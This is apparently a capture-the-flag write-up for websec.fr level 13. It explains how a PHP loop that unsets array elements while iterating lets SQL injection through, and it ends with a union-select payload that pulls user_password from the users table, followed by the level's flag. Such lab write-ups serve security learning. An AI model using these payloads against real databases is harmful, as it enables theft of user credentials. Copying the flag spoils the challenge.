# Level 13

1. First, lets check what is written i-n http://websec.fr/level13/source.php
2. Then we would find out the code below : 
    ```
    for ($i = 0; $i < count($tmp); $i++ ) {
            $tmp[$i] = (int)$tmp[$i];
            if( $tmp[$i] < 1 ) {
                unset($tmp[$i]);
            }
      }
    ```
3. If the value of the array is less than 1, then the function will get rid of it. The main problem is "unset" will decrease the size of array, so count($tmp) will become smaller. That means that the function might not go over the whole array. If the payload is below : 
    ```
    ["table" , "table)) or 1=1; --"]
    ```
    count($tmp) = 2 , $i = 0 
    Then after the function 
    ```
    ["table)) or 1=1ː --"]
    ```
    count($tmp) = 1 , $i = 1
    As you can see, the loop end and with the cute command ~~~
4. So, our mission now is to figure out a perfect payload that can grab the flag out !
    First, we have to check out what kind of tables are there in the database : 
    ```
    user_id   INTEGER PRIMARY KEY,
    user_name TEXT NOT NULL,
    user_privileges INTEGER NOT NULL,
    user_password TEXT NOT NULL
    ```
    Then we would know that we get the data in user_password. I figure out the payload below : 
    ```
    ,,,)) union select 1,2,user_password from users --
    ```
    If you could, please run the function step by step again and you can find out why I write it. Of course we can use Python to get the flag XD 
6. Here is the flag : WEBSEC{SQL_injection_in_your_cms,_made_simple}
